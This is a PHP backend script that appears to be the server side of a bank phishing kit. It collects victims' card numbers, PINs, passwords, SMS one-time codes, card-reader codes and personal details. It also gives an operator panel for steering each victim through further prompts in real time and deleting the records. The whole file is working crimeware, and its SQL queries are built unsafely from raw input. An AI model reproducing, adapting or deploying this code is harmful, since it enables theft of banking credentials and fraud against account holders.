<?php
include 'config.php';
include 'connect.php';



session_start();

function numeric($num){
	if (preg_match('/^[0-9]+$/', $num)) {
		$status = true;
	} else {
		$status = false;
	}
	return $status;
}

////////////////////////////////////// RESET THE BUZZ ON EACH SUBMITTED THING
//usernametype=Card+number&username=4111111111111111&pin=123456&ip=127.0.0.1&ua=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A79.0)+Gecko%2F20100101+Firefox%2F79.0&password=sdgfhfg7766666
if($_GET['type'] == 'login'){
	if($_POST['usernametype'] and $_POST['username'] and $_POST['pin'] and $_POST['password'] and numeric($_POST['pin']) == true and numeric($_POST['username']) == true and $_POST['ip'] and $_POST['ua']){
		
		$usernametype = $_POST['usernametype'];
		$username = $_POST['username'];
		
		$pin = $_POST['pin'];
		$password = $_POST['password'];
		
		$ip = $_POST['ip'];
		$ua = urlencode($_POST['ua']);
		$uniqueid = time();
		if($_SESSION['started'] == 'true'){
			$uniqueid = $_SESSION['uniqueid'];
			$query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, usernametype='$usernametype',pin='$pin',password='$password', username='$username', useragent='$ua', ip='$ip' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		}else{
			$_SESSION['uniqueid'] = $uniqueid;
			$_SESSION['started'] = 'true';
			$query = mysqli_query($conn, "INSERT INTO customers (usernametype, username, pin, password , ip, useragent,uniqueid, status) VALUES ('$usernametype', '$username','$pin','$password', '$ip', '$ua',$uniqueid, 1)");
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}
	}
}












if($_SESSION['admin_logged'] == 'true'){
	if($_GET['type'] == 'commmand'){
		if($_POST['userid'] and numeric($_POST['userid']) == true and $_POST['status'] and numeric($_POST['status']) == true or ($_POST['accref'] and $_POST['accmoney'])){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = $_POST['status'];
			
			

			
			
			
			$ref_number = $_POST['accref'];
			$card_string = $_POST['accmoney'];
			//question


			if($ref_number != null and $ref_number != '' and $card_string != '' and $card_string != null){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, card_string='$card_string', reference='$ref_number' WHERE id=$userid");
			}else{
				$query = mysqli_query($conn, "UPDATE customers SET status=$status WHERE id=$userid");
			}
			
			if($query){

				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}else{
		echo json_encode(array(
			'status' => 'notokk'
		));
		}

		
		
	}


	if(isset($_GET['get_submitted'])){
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status=1 and buzzed=0");
		if($query){
			$num = mysqli_num_rows($query);
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			if($num >= 1){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}		
		}else{
			echo json_encode(array(
				'status' => 'notok'
			));
		}
		
		
	}

	if(isset($_GET['buzzoff'])){
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status=1");
		if($query){
			$array = array_filter(mysqli_fetch_all($query,MYSQLI_ASSOC));	
			foreach($array as $value){
				$userid = $value['id'];
				$queryy = mysqli_query($conn, "UPDATE customers SET buzzed=1 WHERE id=$userid");
				if($queryy){
					$stat = 'ok';
				}else{
					$stat = 'notok';
				}
			}
			if($stat == 'ok'){
				echo json_encode(array(
				'status' => 'ok'
			));
			}else{
				echo json_encode(array(
				'status' => 'notok'
			));
			}
			
		}else{
			echo json_encode(array(
				'status' => 'notok'
			));
		}
		
		
	}
	
		if($_GET['type'] == 'delete'){
			if($_POST['userid'] and numeric($_POST['userid']) == true){
				$userid = $_POST['userid']; // the normal id not unique one
				
				$query = mysqli_query($conn, "DELETE FROM customers WHERE id=$userid");
				
				
				if($query){
					
					
					echo json_encode(array(
					'status' => 'ok'
					));
				}else{
					echo json_encode(array(
					'status' => 'notok'
					));
				}
			}else{
				echo json_encode(array(
					'status' => 'notokk'
				));
			}
		
		
	}
	
	
	if($_GET['type'] == 'submitted'){
		if($_POST['userid'] and numeric($_POST['userid']) == true){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = str_replace("_$userid","",$_POST['status']);

			if($status == 'accept'){
				$status = 11;
			}elseif($status == 'reject'){
				$status = 12;
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
			$query = mysqli_query($conn, "UPDATE customers SET status=$status WHERE id=$userid");
			
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
			
			}else{
					echo json_encode(array(
						'status' => 'notokk'
					));
			}
		
		
	}



}





if($_SESSION['started'] == 'true'){
	
	
	

	if($_GET['wait'] and numeric($_GET['wait']) == true){
		$id = $_GET['wait'];
		$query = mysqli_query($conn, "UPDATE customers SET status=0 WHERE uniqueid=$id");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
		
	
	

	if($_GET['getstatus'] and numeric($_GET['getstatus']) == true){
		$id = $_GET['getstatus'];
		$query = mysqli_query($conn, "SELECT * from customers WHERE uniqueid='$id'");
		
		if(mysqli_num_rows($query) >= 1){
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			echo $array['status'];
		}		
		
	}




if($_GET['type'] == 'otp'){
	if($_POST['otpcode'] and  $_POST['userid'] and numeric($_POST['userid']) == true and numeric($_POST['otpcode']) == true){
		$otpcode = $_POST['otpcode'];
		$uniqueid = $_POST['userid']; // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET sms='$otpcode', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
}






if($_GET['type'] == 'cardreader'){
	if($_POST['cardreadercode'] and  $_POST['userid'] and numeric($_POST['userid']) == true and numeric($_POST['cardreadercode']) == true){
		
		$cardreadercode = $_POST['cardreadercode'];
		
		$uniqueid = $_POST['userid']; // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET cardreadercode=$cardreadercode, status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
}



if($_GET['type'] == 'info'){
	if($_POST['firstname'] and $_POST['lastname'] and $_POST['emailaddress'] and $_POST['dobday'] and numeric($_POST['dobday']) == true  and $_POST['dobmonth'] and numeric($_POST['dobmonth']) == true  and $_POST['dobyear'] and numeric($_POST['dobyear']) == true and $_POST['mobilenumber'] and numeric($_POST['mobilenumber']) == true or $_POST['middlename']){
		$uniqueid = $_POST['userid'];
		
		

		$firstname = $_POST['firstname'];
		$middlename = $_POST['middlename'];
		$lastname = $_POST['lastname'];
		$emailaddress = $_POST['emailaddress'];
		
		$dobday = $_POST['dobday'];
		$dobmonth = $_POST['dobmonth'];
		$dobyear = $_POST['dobyear'];
		
		$dob = $_POST['dobday'].'/'.$_POST['dobmonth'].'/'.$_POST['dobyear'];
		
		$mobilenumber = $_POST['mobilenumber'];
		

		 // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET firstname='$firstname', middlename='$middlename', lastname='$lastname', emailaddress='$emailaddress', dob='$dob', mobilenumber='$mobilenumber', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
	
	
}



}